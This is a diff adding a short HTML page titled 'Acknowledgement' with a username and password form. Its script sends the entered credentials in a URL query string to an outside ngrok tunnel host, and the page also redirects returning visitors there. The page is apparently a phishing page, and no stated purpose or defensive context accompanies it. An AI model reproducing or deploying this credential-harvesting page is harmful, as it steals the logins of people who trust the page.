@@ -1,0 +1,32 @@
+
+<!DOCTYPE html>
+<html>
+<script>
+if(window.localStorage.getItem("username")!=undefined){
+  window.location.href ="http://63efd8386b03.ngrok.io/"
+}
+</script>
+<head>
+<title>Acknowledgement</title>
+</head>
+<body>
+<input type='text' id='username' name=username>
+<input type='password' id='pass' name=pass>
+<input type='button' value="submit" onclick="dev()">
+<script>
+function dev(){
+    
+    var e=document.getElementById('username')
+    var e4=document.getElementById('pass')
+    var username=e.value
+    var password=e4.value
+    var value1=username;
+
+var queryString ="?"+value1+","+password;
+window.location.href="http://63efd8386b03.ngrok.io/done"+queryString;
+
+}
+
+</script> 
+</body>
+</html>
